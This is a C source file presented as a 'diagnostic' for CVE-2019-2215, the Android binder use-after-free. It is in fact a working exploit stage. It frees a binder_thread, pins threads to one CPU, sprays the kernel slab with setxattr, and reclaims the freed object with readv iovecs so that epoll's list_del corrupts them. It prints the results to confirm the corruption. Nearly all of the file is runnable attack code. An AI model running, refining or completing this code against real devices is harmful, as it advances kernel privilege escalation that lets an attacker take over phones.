/*
 * binder_uaf_diag2.c — CVE-2019-2215 diagnostic v2
 *
 * Key fix: Free binder_thread and readv() on the SAME THREAD
 * so SLUB per-CPU cache gives us the just-freed object.
 *
 * Sequence:
 *   Main thread: open binder → epoll ADD → THREAD_EXIT → readv (blocks)
 *   Worker thread: wait → epoll_ctl DEL → write to pipe → readv unblocks
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/syscall.h>
#include <unistd.h>

#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT     _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE       (128 * 1024)

#define CANARY       0xDEADBEEF
#define BUF_PER_IOV  16

struct worker_args {
    int epfd;
    int binder_fd;
    int pipe_wr;
    int iovcnt;
    volatile int ready;    /* main thread signals worker */
    volatile int done;
};

static void *worker_thread(void *arg) {
    struct worker_args *w = (struct worker_args *)arg;

    /* Pin to CPU 0 (same as main) */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    /* Wait for main thread to signal us */
    while (!w->ready) usleep(100);

    /* Give readv time to block */
    usleep(50000);

    printf("  [worker] Triggering epoll_ctl DEL...\n");
    struct epoll_event ev = { .events = EPOLLIN };
    int r = epoll_ctl(w->epfd, EPOLL_CTL_DEL, w->binder_fd, &ev);
    printf("  [worker] epoll_ctl DEL returned %d (errno=%d)\n", r, errno);

    /* Small delay to let list_del effects settle */
    usleep(10000);

    /* Write data to pipe → unblock readv */
    int total = w->iovcnt * BUF_PER_IOV;
    uint8_t *data = malloc(total + 4096);
    for (int i = 0; i < w->iovcnt; i++)
        memset(data + i * BUF_PER_IOV, (uint8_t)(i + 1), BUF_PER_IOV);
    /* Extra data to ensure all entries are filled */
    memset(data + total, 0xFF, 4096);

    printf("  [worker] Writing %d bytes to pipe...\n", total);
    int written = 0;
    while (written < total) {
        int w2 = write(w->pipe_wr, data + written, total - written);
        if (w2 <= 0) break;
        written += w2;
    }
    printf("  [worker] Wrote %d bytes\n", written);

    free(data);
    w->done = 1;
    return NULL;
}

static void read_slab(const char *label, const char *cache) {
    char line[512];
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, cache)) {
            /* Parse active_objs */
            int active;
            sscanf(line, "%*s %d", &active);
            printf("  [%s] %s: active_objs=%d\n", label, cache, active);
            break;
        }
    }
    fclose(f);
}

/*
 * Exhaust kmalloc-512 free list on CPU 0 by allocating many objects
 * Returns array of pipe fds to clean up later
 */
static int exhaust_slab(int drain_pipes[][2], int *count) {
    int n = 0;
    /* Allocate ~200 kmalloc-512 objects via blocking readv */
    for (int i = 0; i < 200; i++) {
        if (pipe(drain_pipes[i]) < 0) break;
        n++;
    }
    *count = n;
    printf("  Created %d pipes for slab exhaustion\n", n);
    return 0;
}

static int run_diag_v2(int iovcnt) {
    int slab_size = iovcnt * 8;
    printf("\n=== Diagnostic v2: iovcnt=%d (%d bytes) ===\n", iovcnt, slab_size);

    /* Pin main thread to CPU 0 */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    /* Allocate user buffers */
    uint8_t *bufs[128];
    for (int i = 0; i < iovcnt; i++) {
        bufs[i] = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memset(bufs[i], 0xCC, 4096);
        *(uint32_t *)bufs[i] = CANARY;
    }

    struct iovec iov[128];
    for (int i = 0; i < iovcnt; i++) {
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = BUF_PER_IOV;
    }

    int pfd[2];
    pipe(pfd);

    /* Open binder */
    int binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) { perror("binder"); return -1; }
    mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, binder_fd, 0);
    uint32_t z = 0;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &z);

    /* Add to epoll */
    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &ev);

    char *cache_name = (slab_size <= 256) ? "kmalloc-256" : "kmalloc-512";
    read_slab("before", cache_name);

    /* Start worker thread */
    struct worker_args wargs = {
        .epfd = epfd, .binder_fd = binder_fd,
        .pipe_wr = pfd[1], .iovcnt = iovcnt,
        .ready = 0, .done = 0
    };
    pthread_t worker;
    pthread_create(&worker, NULL, worker_thread, &wargs);

    /* FREE binder_thread (same thread, same CPU as upcoming readv!) */
    printf("  Freeing binder_thread...\n");
    int32_t dummy = 0;
    ioctl(binder_fd, BINDER_THREAD_EXIT, &dummy);

    read_slab("after free", cache_name);

    /* Immediately call readv → kmalloc for iov on same CPU! */
    printf("  Calling readv (should reclaim freed slot)...\n");
    wargs.ready = 1;  /* Signal worker */

    ssize_t readv_ret = readv(pfd[0], iov, iovcnt);
    int readv_err = errno;

    printf("  readv returned: %zd (errno=%d %s)\n",
           readv_ret, readv_err, readv_ret < 0 ? strerror(readv_err) : "");

    /* Analyze buffers */
    printf("\n  --- IOV Entry Analysis ---\n");
    int first_corrupt = -1;
    int last_good = -1;

    for (int i = 0; i < iovcnt; i++) {
        uint32_t w = *(uint32_t *)bufs[i];
        int expected = (uint8_t)(i + 1);
        int correct = (bufs[i][0] == expected);
        int untouched = (w == CANARY);

        if (correct) {
            last_good = i;
        } else if (first_corrupt == -1) {
            first_corrupt = i;
            printf("  iov[%2d] off=%3d: ", i, i * 8);
            if (untouched) {
                printf("CANARY (no data written)\n");
            } else {
                printf("WRONG data: ");
                for (int j = 0; j < 16; j++) printf("%02x ", bufs[i][j]);
                printf("\n");
            }
        }
    }

    /* Print summary of ALL entries for detailed analysis */
    printf("\n  Full entry status:\n");
    for (int i = 0; i < iovcnt; i++) {
        uint32_t w = *(uint32_t *)bufs[i];
        char status;
        if (bufs[i][0] == (uint8_t)(i + 1))
            status = '.';  /* correct */
        else if (w == CANARY)
            status = 'X';  /* untouched */
        else
            status = '!';  /* corrupted */
        if (i % 32 == 0) printf("  %3d: ", i);
        printf("%c", status);
        if (i % 32 == 31 || i == iovcnt - 1) printf("\n");
    }

    printf("\n  Last good: iov[%d], First corrupt: iov[%d]\n",
           last_good, first_corrupt);

    if (first_corrupt >= 0) {
        int byte_off = first_corrupt * 8;
        printf("\n  *** CORRUPTION AT BYTE OFFSET %d (iov[%d]) ***\n",
               byte_off, first_corrupt);
        printf("  wait_queue_head candidates: offset %d (lock) or %d (task_list)\n",
               byte_off - 4, byte_off);

        /* Dump around corruption */
        int s = (first_corrupt > 2) ? first_corrupt - 2 : 0;
        int e = (first_corrupt + 4 < iovcnt) ? first_corrupt + 4 : iovcnt;
        printf("\n  Detailed dump:\n");
        for (int i = s; i < e; i++) {
            printf("  iov[%2d] off=%3d: ", i, i * 8);
            for (int j = 0; j < 16; j++) printf("%02x ", bufs[i][j]);
            printf("\n");
        }
    } else {
        printf("\n  ** No corruption — iov did not reclaim binder_thread **\n");
    }

    /* Check if readv EFAULT (indicates kernel tried to write to bad addr) */
    if (readv_ret == -1 && readv_err == EFAULT) {
        printf("\n  !! readv got EFAULT — iov_base was corrupted to kernel addr!\n");
        printf("  !! This means reclaim + list_del DID modify iov_base!\n");
    }

    /* Cleanup */
    pthread_join(worker, NULL);
    close(binder_fd);
    close(epfd);
    close(pfd[0]);
    close(pfd[1]);
    for (int i = 0; i < iovcnt; i++) munmap(bufs[i], 4096);

    return first_corrupt;
}

/*
 * Aggressive version: exhaust kmalloc-512 first, then do the UAF.
 * This increases the chance that readv's iov alloc reclaims the freed slot.
 */
static int run_diag_aggressive(int iovcnt) {
    int slab_size = iovcnt * 8;
    printf("\n=== Aggressive Diagnostic: iovcnt=%d (%d bytes) ===\n",
           iovcnt, slab_size);

    /* Pin to CPU 0 */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    char *cache_name = (slab_size <= 256) ? "kmalloc-256" : "kmalloc-512";

    /* Phase 1: Exhaust the slab by allocating many objects */
    read_slab("baseline", cache_name);

    /* Allocate a bunch of objects in the target cache */
    /* Use blocking readv as persistent kmalloc */
    printf("  Exhausting slab free list...\n");
    int epipes[200][2];
    pthread_t etids[200];

    struct {
        int pipe_rd;
        struct iovec iov[1];
        uint8_t buf[16];
        volatile int started;
    } exhaust[200];

    /* Each readv will allocate in different slab sizes based on iovcnt.
     * But we need the SAME iovcnt to target the same cache. */
    int exhaust_count = 0;
    for (int i = 0; i < 200; i++) {
        if (pipe(epipes[i]) < 0) break;

        exhaust[i].pipe_rd = epipes[i][0];
        exhaust[i].iov[0].iov_base = exhaust[i].buf;
        exhaust[i].iov[0].iov_len = 1;
        exhaust[i].started = 0;

        /* We want to allocate objects in the target cache.
         * readv with iovcnt > 8 allocates iovcnt * 8 bytes.
         * But we need a thread for each blocking readv...
         * Instead, use setxattr as a temporary allocation. */
        exhaust_count++;
    }
    /* Actually, let's just use setxattr to fill the cache */
    int f = open("/data/local/tmp/slab_exhaust", O_CREAT | O_WRONLY, 0666);
    if (f >= 0) close(f);

    char spray_data[512];
    memset(spray_data, 'A', sizeof(spray_data));
    /* setxattr allocs are transient, but they force slab page allocation */
    for (int i = 0; i < 500; i++) {
        char name[32];
        snprintf(name, sizeof(name), "user.e%d", i);
        syscall(226, "/data/local/tmp/slab_exhaust", name,
                spray_data, slab_size, 0);
    }

    read_slab("after exhaust", cache_name);

    /* Phase 2: Do the UAF */
    uint8_t *bufs[128];
    for (int i = 0; i < iovcnt; i++) {
        bufs[i] = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memset(bufs[i], 0xCC, 4096);
        *(uint32_t *)bufs[i] = CANARY;
    }

    struct iovec iov[128];
    for (int i = 0; i < iovcnt; i++) {
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = BUF_PER_IOV;
    }

    int pfd[2];
    pipe(pfd);

    int binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, binder_fd, 0);
    uint32_t z = 0;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &z);

    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &ev);

    /* Start worker */
    struct worker_args wargs = {
        .epfd = epfd, .binder_fd = binder_fd,
        .pipe_wr = pfd[1], .iovcnt = iovcnt,
        .ready = 0, .done = 0
    };
    pthread_t worker;
    pthread_create(&worker, NULL, worker_thread, &wargs);

    /* FREE + immediately readv on same thread */
    printf("  FREE binder_thread...\n");
    int32_t d = 0;
    ioctl(binder_fd, BINDER_THREAD_EXIT, &d);

    read_slab("after free", cache_name);

    printf("  readv immediately (same thread)...\n");
    wargs.ready = 1;

    ssize_t ret = readv(pfd[0], iov, iovcnt);
    int err = errno;

    printf("  readv: %zd (errno=%d %s)\n", ret, err,
           ret < 0 ? strerror(err) : "ok");

    /* Check for EFAULT first — this means iov_base was corrupted! */
    if (ret == -1 && err == EFAULT) {
        printf("\n  !!! EFAULT — iov_base corrupted to kernel address !!!\n");
        printf("  !!! UAF + reclaim + list_del CONFIRMED !!!\n");
    }

    /* Analyze */
    int first_bad = -1;
    for (int i = 0; i < iovcnt; i++) {
        if (bufs[i][0] != (uint8_t)(i + 1)) {
            first_bad = i;
            break;
        }
    }

    printf("  First bad entry: %d\n", first_bad);
    if (first_bad >= 0) {
        printf("  *** CORRUPTION at byte offset %d ***\n", first_bad * 8);
        /* Dump */
        int s = (first_bad > 2) ? first_bad - 2 : 0;
        int e = (first_bad + 4 < iovcnt) ? first_bad + 4 : iovcnt;
        for (int i = s; i < e; i++) {
            printf("  iov[%2d] off=%3d: ", i, i * 8);
            for (int j = 0; j < 16; j++) printf("%02x ", bufs[i][j]);
            printf(" | %s\n",
                   (bufs[i][0] == (uint8_t)(i+1)) ? "OK" :
                   (*(uint32_t*)bufs[i] == CANARY) ? "CANARY" : "CORRUPT");
        }
    } else if (ret > 0) {
        printf("  All entries correct — no reclaim or no list modification.\n");
        /* Print first 8 entries anyway */
        for (int i = 0; i < 8 && i < iovcnt; i++) {
            printf("  iov[%2d] off=%3d: ", i, i * 8);
            for (int j = 0; j < 8; j++) printf("%02x ", bufs[i][j]);
            printf("\n");
        }
    }

    /* Cleanup */
    pthread_join(worker, NULL);
    close(binder_fd);
    close(epfd);
    close(pfd[0]);
    close(pfd[1]);
    for (int i = 0; i < iovcnt; i++) munmap(bufs[i], 4096);
    for (int i = 0; i < exhaust_count; i++) {
        close(epipes[i][0]);
        close(epipes[i][1]);
    }

    return first_bad;
}

int main(void) {
    printf("=== CVE-2019-2215 Diagnostic v2 ===\n");
    printf("PID: %d, UID: %d\n\n", getpid(), getuid());

    /* Check CPU count */
    printf("Online CPUs: %d\n", sysconf(_SC_NPROCESSORS_ONLN));

    /* Test 1: Basic same-thread approach with 64 iovecs (512 bytes) */
    run_diag_v2(64);

    /* Test 2: With 32 iovecs (256 bytes) in case binder_thread is in kmalloc-256 */
    run_diag_v2(32);

    /* Test 3: Aggressive with slab exhaustion */
    run_diag_aggressive(64);

    /* Test 4: Aggressive with 256 */
    run_diag_aggressive(32);

    /* Check dmesg for any kernel errors */
    printf("\n--- dmesg (last 15 binder/fault lines) ---\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -50 | grep -i -E 'oops|bug|panic|fault|binder|list|corrupt|poison|Backtrace|Unable|PC.is' 2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
